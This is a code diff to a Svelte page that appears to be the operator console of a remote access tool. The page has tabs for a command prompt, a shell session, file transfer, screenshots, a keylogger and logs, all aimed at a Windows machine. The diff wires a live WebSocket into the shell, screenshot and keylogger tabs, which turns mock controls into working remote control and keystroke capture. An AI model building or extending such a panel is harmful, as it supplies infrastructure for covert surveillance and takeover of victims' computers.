@@ -1,4 +1,5 @@
 <script lang="ts">
+	import { onMount, onDestroy } from 'svelte';
 	import DeviceHeader from '$lib/components/device/DeviceHeader.svelte';
 	import DeviceInfo from '$lib/components/device/DeviceInfo.svelte';
 	import DeviceTabs from '$lib/components/device/DeviceTabs.svelte';
@@ -8,9 +9,10 @@
 	import ScreenshotsTab from '$lib/components/device/tabs/ScreenshotsTab.svelte';
 	import KeyloggerTab from '$lib/components/device/tabs/KeyloggerTab.svelte';
 	import LogsTab from '$lib/components/device/tabs/LogsTab.svelte';
+	import { createDeviceSocket, type DeviceSocketState } from '$lib/stores/deviceSocket';
 	import type { Device } from '$lib/types';
 
-	// Mock device data — replace with actual server load data
+	// ── Device data (replace with real load()) ────────────────────────────
 	const device: Device = {
 		name: 'DESKTOP-WIN10-01',
 		status: 'online' as const,
@@ -35,6 +37,32 @@
 		lastSeen: '2026-03-27 10:04:26'
 	};
 
+	// ── WebSocket ─────────────────────────────────────────────────────────
+	let socket: ReturnType<typeof createDeviceSocket>;
+    let state: DeviceSocketState = {
+        connected: false,
+        deviceOnline: false,
+        error: null
+    };
+
+	onMount(() => {
+		socket = createDeviceSocket(device.id);
+
+		const unsubscribe = socket.subscribe((s) => {
+			state = s;
+		});
+
+		onDestroy(() => {
+			unsubscribe();
+			socket?.destroy();
+		});
+	});
+
+	onDestroy(() => {
+		socket?.destroy();
+	});
+
+	// ── Tabs ──────────────────────────────────────────────────────────────
 	type Tab =
 		| 'command-prompt'
 		| 'shell-session'
@@ -57,7 +85,7 @@
 <div class="device-page">
 	<DeviceHeader
 		name={device.name}
-		status={device.status}
+		status={state.deviceOnline ? 'online' : 'offline'}
 		elevated={device.elevated}
 		deviceId={device.id}
 	/>
@@ -68,15 +96,15 @@
 
 	<div class="tab-content">
 		{#if activeTab === 'command-prompt'}
-			<CommandPromptTab />
+			<CommandPromptTab {socket} />
 		{:else if activeTab === 'shell-session'}
-			<ShellSessionTab />
+			<ShellSessionTab {socket} />
 		{:else if activeTab === 'file-transfer'}
 			<FileTransferTab />
 		{:else if activeTab === 'screenshots'}
-			<ScreenshotsTab />
+			<ScreenshotsTab {socket} />
 		{:else if activeTab === 'keylogger'}
-			<KeyloggerTab />
+			<KeyloggerTab {socket} />
 		{:else if activeTab === 'logs'}
 			<LogsTab />
 		{/if}
